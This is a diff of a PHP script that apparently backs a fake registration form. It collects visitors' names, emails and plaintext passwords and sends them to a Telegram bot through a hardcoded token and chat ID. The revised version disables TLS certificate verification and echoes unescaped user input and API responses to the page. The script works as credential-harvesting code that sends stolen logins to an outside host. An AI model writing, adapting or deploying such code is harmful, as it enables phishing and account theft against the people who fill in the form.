@@ -1,59 +1,89 @@
 <?php
 
+// -------------------------------------------------------
 // 1. Only accept POST requests
+// -------------------------------------------------------
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
-    die("Invalid request.");
+    die("Invalid request. This page only accepts POST.");
 }
 
-// 2. Read form fields (matching EXACT input names)
+// -------------------------------------------------------
+// 2. Read form fields exactly as sent by index.html
+// -------------------------------------------------------
 $first = trim($_POST['firstName'] ?? '');
 $last  = trim($_POST['lastName'] ?? '');
 $email = trim($_POST['email'] ?? '');
 $pass1 = $_POST['password'] ?? '';
 $pass2 = $_POST['password-confirm'] ?? '';
 
-// 3. Basic validation
 if (!$first || !$last || !$email || !$pass1 || !$pass2) {
-    die("All fields are required.");
+    die("Error: Missing required fields.");
 }
 
 if ($pass1 !== $pass2) {
-    die("Passwords do not match.");
+    die("Error: Passwords do not match.");
 }
 
-// 4. Telegram Bot configuration
-$bot_token = "8596833170:AAGe9k7d3JdQhfeiYtRJaXz42QeXB63ieas"; // <-- REPLACE with your REAL bot token
-$chat_id   = "8564583333"; // <-- Your chat ID is correct
+// -------------------------------------------------------
+// 3. Telegram Bot Configuration
+// -------------------------------------------------------
+$bot_token = "8596833170:AAGe9k7d3JdQhfeiYtRJaXz42QeXB63ieas";  // <-- Your token
+$chat_id   = "8564583333";                                      // <-- Your chat ID
 
-// 5. Build the Telegram message
-$message = "📦 *New Registration*\n\n"
-         . "👤 *Name:* $first $last\n"
-         . "📧 *Email:* $email\n"
-         . "🔑 *Password:* $pass1\n"
-         . "🔁 *Retyped Password:* $pass2\n"
-         . "⏰ *Time:* " . date("Y-m-d H:i:s");
+// -------------------------------------------------------
+// 4. Build Telegram Message
+// -------------------------------------------------------
+$message =
+"📦 NEW REGISTRATION\n\n" .
+"👤 Name: $first $last\n" .
+"📧 Email: $email\n" .
+"🔑 Password: $pass1\n" .
+"⏰ Time: " . date("Y-m-d H:i:s");
 
-// 6. Telegram API endpoint
+// -------------------------------------------------------
+// 5. Telegram API Endpoint
+// -------------------------------------------------------
 $url = "https://api.telegram.org/bot$bot_token/sendMessage";
 
-// 7. Data sent via POST
+// -------------------------------------------------------
+// 6. Fields sent to Telegram
+// -------------------------------------------------------
 $post_fields = [
     'chat_id' => $chat_id,
     'text' => $message,
     'parse_mode' => 'Markdown'
 ];
 
-// 8. Send the message using cURL
+// -------------------------------------------------------
+// 7. Send via cURL with full DEBUG OUTPUT
+// -------------------------------------------------------
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
+// Allow self-signed hosts (some shared hosts require this)
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
 $result = curl_exec($ch);
+
+// DEBUG: If cURL failed, show the reason CLEARLY
+if ($result === false) {
+    die("❌ cURL ERROR: " . curl_error($ch));
+}
+
+// DEBUG: Show Telegram API's response
+echo "📩 Telegram API Response:<br><pre>";
+print_r($result);
+echo "</pre>";
+
 curl_close($ch);
 
-// 9. Success output
-echo "Registration received — thank you, $first!";
+// -------------------------------------------------------
+// 8. Final user message (will appear below debug data)
+// -------------------------------------------------------
+echo "<br>Registration received — thank you, $first!";
 
 ?>
